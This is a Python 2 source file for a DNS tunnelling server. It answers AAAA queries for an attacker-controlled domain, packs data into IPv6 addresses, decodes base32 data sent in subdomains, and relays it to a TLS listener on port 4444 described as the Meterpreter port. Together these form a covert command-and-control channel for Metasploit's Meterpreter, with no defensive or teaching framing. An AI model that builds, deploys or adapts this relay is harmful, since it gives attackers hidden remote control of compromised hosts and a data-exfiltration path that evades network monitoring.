#!/usr/bin/env python
# coding=utf-8

import argparse
import datetime
import sys
import time
import threading
import traceback
import SocketServer
import struct
import re
import ssl
import Queue
import copy
import base64
import logging

try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("dns_server")


def pack_byte_to_hn(val):
    """
    Pack byte to network order unsigned short
    """
    return (val << 8) & 0xffff


def pack_2byte_to_hn(low_byte, high_byte):
    """
    Pack 2 bytes to network order unsigned short
    """
    return ((low_byte << 8) | high_byte) & 0xffff


def pack_ushort_to_hn(val):
    """
    Pack unsigned short to network order unsigned short
    """
    return ((val & 0xff) << 8) | ((val & 0xff00) >> 8) & 0xffff


def xor_bytes(key, data):
    return ''.join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))


class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass


class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


class IPv6Encoder():
    MAX_IPV6RR_NUM = 17
    MAX_DATA_IN_RR = 14
    MAX_PACKET_SIZE = MAX_IPV6RR_NUM * MAX_DATA_IN_RR
    IPV6_FORMAT = ":".join(["{:04x}"]*8)

    @staticmethod
    def get_next_sdomain(current_sdomain):
        lst = [ord(x) for x in current_sdomain]
        lst[-1] += 1
        if lst[-1] > 122:
            lst[-1] = 97
            lst[-2] += 1
            if lst[-2] > 122:
                lst[-2] = 97
                lst[-3] += 1
                if lst[-3] > 122:
                    lst[-3] = 97
                    lst[-4] += 1
                    if lst[-4] > 122:
                        lst[-4] = 97

        return ''.join([chr(x) for x in lst])

    @staticmethod
    def _encode_nextdomain_datasize(next_domain, data_size):
        res = [0xfe81]
        for ch in next_domain:
            res.append(pack_byte_to_hn(ord(ch)))
        res.append(pack_2byte_to_hn(0 if data_size <= IPv6Encoder.MAX_PACKET_SIZE else 1, data_size & 0xff))
        res.append(pack_ushort_to_hn(data_size >> 8 & 0xffff))
        res.append(pack_byte_to_hn(data_size >> 24 & 0xff))
        return res

    @staticmethod
    def _encode_data_prefix(prefix, index, data):
        assert(len(data) <= IPv6Encoder.MAX_DATA_IN_RR)
        assert(index < IPv6Encoder.MAX_IPV6RR_NUM)
        res = []
        data_size = len(data)
        res.append(pack_2byte_to_hn(prefix, (index << 4 if index < 16 else 0) | data_size))
        for i in range(data_size//2):
            res.append(pack_2byte_to_hn(ord(data[i*2]), ord(data[i*2 + 1])))
        if data_size % 2 != 0:
            res.append(pack_byte_to_hn(ord(data[data_size-1])))
        return res

    @staticmethod
    def _align_hextets(hextests):
        l = len(hextests)
        if l < 8:
            hextests += [0] * (8-l)
        return hextests

    @staticmethod
    def hextets_to_str(hextets):
        return IPv6Encoder.IPV6_FORMAT.format(*IPv6Encoder._align_hextets(hextets))

    @staticmethod
    def encode_senddata_header(sub_domain, data_size):
        return [IPv6Encoder.hextets_to_str(IPv6Encoder._encode_nextdomain_datasize(sub_domain, data_size))]

    @staticmethod
    def encode_data(data):
        logger.info("Encoding data...")
        ipv6blocks = []  # Block of IPv6 addresses
        data_size = len(data)
        logger.debug("Data size - %d bytes", data_size)
        index = 0
        while index < data_size:
            block = []
            next_index = index + IPv6Encoder.MAX_PACKET_SIZE
            if next_index < data_size:
                # full block
                for i in range(IPv6Encoder.MAX_IPV6RR_NUM):
                    is_last = (i == (IPv6Encoder.MAX_IPV6RR_NUM - 1))
                    cur_pos = index + i * IPv6Encoder.MAX_DATA_IN_RR
                    hextets = IPv6Encoder._encode_data_prefix(0xfe if is_last else 0xff,
                                                              i, data[cur_pos:cur_pos + IPv6Encoder.MAX_DATA_IN_RR])
                    block.append(IPv6Encoder.hextets_to_str(hextets))
            else:
                # partial block
                i = 0
                block_size = data_size - index
                while i < block_size:
                    next_i = i + IPv6Encoder.MAX_DATA_IN_RR
                    if next_i > block_size:
                        next_i = block_size
                    num_rr = i // IPv6Encoder.MAX_DATA_IN_RR
                    is_last = (num_rr == (IPv6Encoder.MAX_IPV6RR_NUM - 1))
                    cur_pos = index + i
                    hextets = IPv6Encoder._encode_data_prefix(0xfe if is_last else 0xff,
                                                              num_rr, data[cur_pos:cur_pos + (next_i-i)])
                    block.append(IPv6Encoder.hextets_to_str(hextets))
                    i = next_i

            ipv6blocks.append(block)
            index = next_index
        logger.info("Encoding done. %d ipv6 blocks generated", len(ipv6blocks))
        logger.debug("IPv6Blocks data: %s", ipv6blocks)
        return ipv6blocks

    @staticmethod
    def encode_ready_receive():
        return ["ffff:0000:0000:0000:0000:0000:0000:0000"]

    @staticmethod
    def encode_finish_send():
        return ["ffff:0000:0000:0000:0000:ff00:0000:0000"]

    @staticmethod
    def encode_send_more_data():
        return ["ffff:0000:0000:0000:0000:f000:0000:0000"]


LPORT = 4444
CONNECTED = False

servers = []
_clients = {}
dns_server = None


def get_client_by_id(client_id):
    if client_id in _clients:
        return _clients[client_id]


def register_client(client_id, client):
    if client_id in _clients:
        logger.warning("Clients exists alredy. Rewriting it.")
    _clients[client_id] = client


class Client(object):
    INITIAL = 1
    INCOMING_DATA = 2

    def __init__(self, name):
        register_client(name, self)
        self.state = self.INITIAL
        self.received_data_size = 0
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.setLevel(logging.DEBUG)
        self.received_data = ""
        self.last_received_index = -1
        self.sub_domain = "aaaa"
        self.send_data = ""
        self.enc_send_data = []
        self.send_indexes = set()
        self.server_queue = Queue.Queue()
        self.client_queue = Queue.Queue()

    def _setup_receive(self, exp_data_size, padding):
        self.state = self.INCOMING_DATA
        self.received_data_size = exp_data_size
        self.padding = padding
        self.received_data = ""
        self.last_received_index = -1

    def _initial_state(self):
        self.state = self.INITIAL
        self.received_data = ""
        self.padding = 0
        self.last_received_index = -1
        self.received_data_size = 0

    def incoming_data_header(self, data_size, padding):
    
        if self.received_data_size == data_size and self.state == self.INCOMING_DATA:
            self.logger.info("Dublicated header request: waiting %d bytes of data with padding %d", data_size, padding)
            return IPv6Encoder.encode_ready_receive()
        elif self.state == self.INCOMING_DATA:
            self.logger.error("Bad request. Client in the receiving data state")
            return None
        self.logger.info("Data header: waiting %d bytes of data with padding %d", data_size, padding)
        self._setup_receive(data_size, padding)
        return IPv6Encoder.encode_ready_receive()

    def incoming_data(self, data, index, counter):
        self.logger.debug("Data %s, padding %d, index %d", data, index, counter)
        if self.state != self.INCOMING_DATA:
            self.logger.error("Bad state(%d) for this action. Send finish.", self.state)
            return IPv6Encoder.encode_finish_send()

        data_size = len(data)

        if data_size == 0:
            self.logger.error("Empty incoming data. Send finish.")
            return IPv6Encoder.encode_finish_send()

        if self.last_received_index >= index:
            self.logger.info("Dublicated packet.")
            return IPv6Encoder.encode_send_more_data()

        if len(self.received_data) + data_size > self.received_data_size:
            self.logger.error("Overflow.Something was wrong. Send finish and clear all received data.")
            self._initial_state()
            return IPv6Encoder.encode_finish_send()

        self.received_data += data
        self.last_received_index = index
        if len(self.received_data) == self.received_data_size:
            self.logger.info("All expected data is received")
            try:
                packet = base64.b32decode((self.received_data + "=" * self.padding).upper())
                self.logger.info("Put decoded data to the server queue")
                self.server_queue.put(packet)
                self._initial_state()
            except Exception:
                self.logger.error("Error during decode received data", exc_info=True)
                self._initial_state()
                return IPv6Encoder.encode_finish_send()
        return IPv6Encoder.encode_send_more_data()

    def request_data_header(self, sub_domain):
        if sub_domain == self.sub_domain:
            data_size = len(self.send_data)
            if data_size == 0 and (len(self.enc_send_data) == 0 or len(self.send_indexes) == len(self.enc_send_data)):
                data = None
                try:
                    self.logger.info("Checking client queue...")
                    data = self.client_queue.get_nowait()
                    self.logger.debug("New data size is %d", len(data))
                except Queue.Empty:
                    pass
                if data is not None:
                    self.logger.info("There are new data for sending to client")
                    self.send_data = data
            data_size = len(self.send_data)
            if data_size != 0:
                next_sub = IPv6Encoder.get_next_sdomain(self.sub_domain)
                sub_domain = next_sub
                self.enc_send_data = IPv6Encoder.encode_data(self.send_data)
                self.send_indexes = set()
                self.send_data = ""
            else:
                self.logger.info("No data for client.")
            self.logger.info("Send data header to client with domain %s and size %d", sub_domain, data_size)
            return IPv6Encoder.encode_senddata_header(sub_domain, data_size)
        else:
            self.logger.info("Subdomain is different %s(request) - %s(client)", sub_domain, self.sub_domain)
            if sub_domain == "aaaa":
                self.logger.info("MIGRATE. Not DONE")
            else:
                self.sub_domain = sub_domain
                self.send_data = ""
                self.enc_send_data = ""

    def request_data(self, sub_domain, index):
        self.logger.debug("request_data - %s, %d", sub_domain, index)
        if sub_domain != self.sub_domain:
            self.logger.error("request_data: subdomains are not equal(%s-%s)", self.sub_domain, sub_domain)
            return None
        lst_size = len(self.enc_send_data)
        if index < lst_size:
            self.logger.debug("request_data: return data %s", self.enc_send_data[index])
            self.send_indexes.add(index)
            return self.enc_send_data[index]
        else:
            self.logger.error("request_data: index(%d) out of range (0,%d)", index, lst_size)

    def server_put_data(self, data):
        self.logger.info("Server adds data to queue.")
        self.client_queue.put(data)

    def server_get_data(self, timeout=2):
        self.logger.info("Checking server queue...")
        data = None
        try:
            data = self.server_queue.get(True, timeout)
            self.logger.info("There are new data(length=%d) for the server", len(data))
        except Queue.Empty:
            pass
        return data


class Request(object):
    EXPR = None
    LOGGER = logging.getLogger("Request")

    @classmethod
    def match(cls, qname):
        if cls.EXPR:
            return cls.EXPR.match(qname)

    @classmethod
    def handle(cls, qname):
        m = cls.match(qname)
        if not m:
            return None
        client_id = m.group("client")
        client = get_client_by_id(client_id)
        if client is not None:
            Request.LOGGER.info("Request will be handled by class %s", cls.__name__)
            return cls._handle_client(client, m)
        else:
            Request.LOGGER.error("Can't find client with name %s", client_id)
        return None

    @classmethod
    def _handle_client(cls, client, match_data):
        raise NotImplementedError()


class GetDataHeader(Request):
    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.g\.(?P<rnd>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, match_data):
        sub_domain = match_data.group('sub_dom')
        return client.request_data_header(sub_domain)


class GetDataRequest(Request):
    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.(?P<index>\d+)\.(?P<rnd>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, match_data):
        sub_domain = match_data.group('sub_dom')
        index = int(match_data.group('index'))
        return client.request_data(sub_domain, index)


class IncomingDataRequest(Request):
    EXPR = re.compile(r"t\.(?P<base32>.*)\.(?P<idx>\d+)\.(?P<cnt>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, match_data):
        enc_data = match_data.group('base32')
        index = int(match_data.group('idx'))
        counter = int(match_data.group('cnt'))
        enc_data = re.sub(r"\.", "", enc_data)
        #enc_data = re.sub(r"\-", "+", enc_data)
        #enc_data = re.sub(r"\_", "/", enc_data)
        return client.incoming_data(enc_data, index, counter)


class IncomingDataHeaderRequest(Request):
    EXPR = re.compile(r"(?P<size>\d+)\.(?P<padd>\d+)\.tx\.(?P<rnd>\d+)\.(?P<client>\w)")

    @classmethod
    def _handle_client(cls, client, match_data):
        size = int(match_data.group('size'))
        padding = int(match_data.group('padd'))
        return client.incoming_data_header(size, padding)


class AAAARequestHandler(object):
    def __init__(self, domain):
        self.domain = domain
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.setLevel(logging.DEBUG)
        self.request_handler = [
            IncomingDataHeaderRequest,
            IncomingDataRequest,
            GetDataRequest,
            GetDataHeader
        ]

    def process_request(self, reply, qname):
        # cut domain from requested qname
        i = qname.rfind("." + self.domain)
        if i == -1:
            self.logger.error("Bad request: can't find domain %s in %s", self.domain, qname)
            return
        sub_domain = qname[:i]
        self.logger.debug("requested subdomain name is %s", qname)
        is_handled = False
        for handler in self.request_handler:
            answer = handler.handle(sub_domain)
            if answer is not None:
                for rr in answer:
                    self.logger.debug("Add resource record to the reply %s", rr)
                    reply.add_answer(RR(rname=qname, rtype=QTYPE.AAAA, rclass=1, ttl=TTL,
                                        rdata=AAAA(rr)))
                is_handled = True
                break
        if not is_handled:
            self.logger.error("Request with subdomain %s doesn't handled", qname)


class DnsServer(object):
    def __init__(self, domain, ipv4, ns_servers):
        self.domain = domain + "."
        self.ipv4 = ipv4
        self.ns_servers = ns_servers
        self.logger = logging.getLogger(self.__class__.__name__)
        self.handlers = {
            QTYPE.NS: self._process_ns_request,
            QTYPE.A: self._process_a_request,
            QTYPE.AAAA: self._process_aaaa_request,
        }
        self.aaaa_handler = AAAARequestHandler(self.domain)

    def process_request(self, request):
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        qname = request.q.qname
        qn = str(qname)
        qtype = request.q.qtype
        qt = QTYPE[qtype]
        if qn.endswith(self.domain):
            if qtype in self.handlers:
                self.logger.info("Process request for type %s", qt)
                self.handlers[qtype](reply, qn)
            else:
                self.logger.info("%s request type is not supported", qt)
        else:
            self.logger.info("DNS request for domain %s is not handled by this server. Sending empty answer.", qn)
        self.logger.info("Send reply for DNS request")
        self.logger.debug("Reply data: %s", reply)
        return reply.pack()

    def _process_ns_request(self, reply, qname):
        for server in self.ns_servers:
            reply.add_answer(RR(rname=qname, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=server))

    def _process_a_request(self, reply, qname):
        reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(self.ipv4)))

    def _process_aaaa_request(self, reply, qname):
        if self.aaaa_handler is not None:
            self.aaaa_handler.process_request(reply, qname)


def dns_response(data):
    try:
        request = DNSRecord.parse(data)
        if dns_server:
            return dns_server.process_request(request)
        else:
            logger.error("Dns server is not created.")
            return None
    except Exception as e:
        logger.error("Parse error " + str(e), exc_info=True)
        return None


class BaseRequestHandlerDNS(SocketServer.BaseRequestHandler):
    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        logger.info("%s DNS request %s (%s %s):", self.__class__.__name__[:3], now, self.client_address[0],
                    self.client_address[1])
        try:
            data = self.get_data()
            logger.debug("Size:%d, data %s", len(data), data)
            dns_ans = dns_response(data)
            if dns_ans:
                self.send_data(dns_ans)
        except Exception:
            logger.error("Exception", exc_info=True)


class MeterBaseRequestHandler(SocketServer.BaseRequestHandler):
    def get_data(self):
        data = self.request.recv(256)
        return data

    def send_data(self, data):
        return self.request.sendall(data)

    def handle(self):
        buflen = 25600

        s = ssl.wrap_socket(self.request,
                            # keyfile = "server.key",
                            # ca_certs="server.crt",
                            cert_reqs=ssl.CERT_NONE,
                            server_side=False)
        # server_side=True,
        # ssl_version=ssl.PROTOCOL_SSLv23)
        s.setblocking(False)
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        logger.info("%s TCP request %s (%s %s):", self.__class__.__name__[:3], now, self.client_address[0],
                    self.client_address[1])
        try:
            data = s.recv(buflen)
        except ssl.SSLError as e:
            data = None
        logger.debug("Read on empty client socket: {}".format(data))

        s.write("GET /123456789 HTTP/1.0\r\n\r\n")
        # Give client a chance to write something
        time.sleep(0.5)

        # Session
        while True:
            s.settimeout(0.5)
            try:
                logger.info("WAITING FOR THE HEADER")
                data = s.recv(8)  # get header
            except socket.timeout:
                logger.info("EPTY IN")
                data = None
            except ssl.SSLError, e:
                if str(e) == "('The read operation timed out',)":
                    logger.info("EPTY IN2")
                    data = None
                else:
                    logger.error("Server ERROR %s", e, exc_info=True)
                    data = None
                    s = None
                    break
            except Exception  as e:
                logger.error("Server ERROR2 %s", e)
                data = None
                s = None
                break
            s.settimeout(None)

            cl = get_client_by_id('a')
            if data is None:
                logger.info("EMPTY")
                # time.sleep(1)
                # continue
                return_tlv = cl.server_get_data(1)
                logger.info("Got data length %d", len(return_tlv) if return_tlv else 0)
            else:
                logger.info("PARSE HEADER")
                # Parse header
                xor_key = data[:4][::-1]
                header_length = xor_bytes(xor_key, data[4:8])
                pkt_length = struct.unpack('>I', header_length)[0] - 4
                # Get all data
                logger.info("in len: %d", pkt_length)
                s.settimeout(20 * 60)
                while pkt_length > 0:
                    try:
                        packet = s.recv(pkt_length)  # get header
                        pkt_length -= len(packet)
                        data += packet
                        logger.info("left: %d", pkt_length)
                    except Exception  as e:
                        logger.error("SERVER ERROR %s", e, exc_info=True)
                        packet = None
                        s = None
                        break
                # Ready
                s.settimeout(None)
                logger.debug("Server said {}".format(" ".join([hex(ord(ch))[2:] for ch in data])))
                cl.server_put_data(data)
                return_tlv = cl.server_get_data()
                logger.info("Got data length %d", len(return_tlv) if return_tlv else 0)

            if return_tlv:
                logger.debug("Client said {}".format(" ".join([hex(ord(ch))[2:] for ch in return_tlv])))
                try:
                    logger.info("Send data to server")
                    s.write(return_tlv)
                except Exception  as e:
                    logger.error("Server ERROR 2 %s", e, exc_info=True)
                    data = None
                    s = None
                    break
                logger.info("SENT")

            time.sleep(2)


class TCPRequestHandler(BaseRequestHandlerDNS):
    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandlerDNS):
    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main():
    parser = argparse.ArgumentParser(description='Magic')
    parser.add_argument('--dport', default=53, type=int, help='The DNS port to listen on.')
    parser.add_argument('--lport', default=4444, type=int, help='The Meterpreter port to listen on.')
    parser.add_argument('--domain', type=str, required=True, help='The domain name')
    parser.add_argument('--ipaddr', type=str, required=True, help='DNS IP')

    args = parser.parse_args()
    global D
    ns_records = []
    global IP
    global TTL
    global LPORT
    global dns_server
    LPORT = args.lport

    D = DomainName(args.domain + '.')  # Init domain string
    ns_records.append(NS(D.ns1))
    ns_records.append(NS(D.ns2))
    IP = args.ipaddr
    TTL = 1

    client = Client('a')
    dns_server = DnsServer(args.domain, args.ipaddr, ns_records)

    logger.info("Starting nameserver...")

    servers.append(SocketServer.ThreadingUDPServer(('', args.dport), UDPRequestHandler))
    servers.append(SocketServer.ThreadingTCPServer(('', args.dport), TCPRequestHandler))
    servers.append(ThreadedTCPServer(('', LPORT), MeterBaseRequestHandler))
    thread = threading.Thread(target=servers[-1].serve_forever)  # that thread will start one more thread for each request
    thread.daemon = True  # exit the server thread when the main thread terminates
    thread.start()

    print("%s server loop running in thread: %s" % (servers[-1].RequestHandlerClass.__name__[:3], thread.name))

    for s in servers:
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        logger.info("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))

    try:
        while True:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()

    except KeyboardInterrupt:
        pass
    finally:
        logger.info("Shutdown server...")
        for s in servers:
            s.shutdown()

if __name__ == '__main__':
    main()
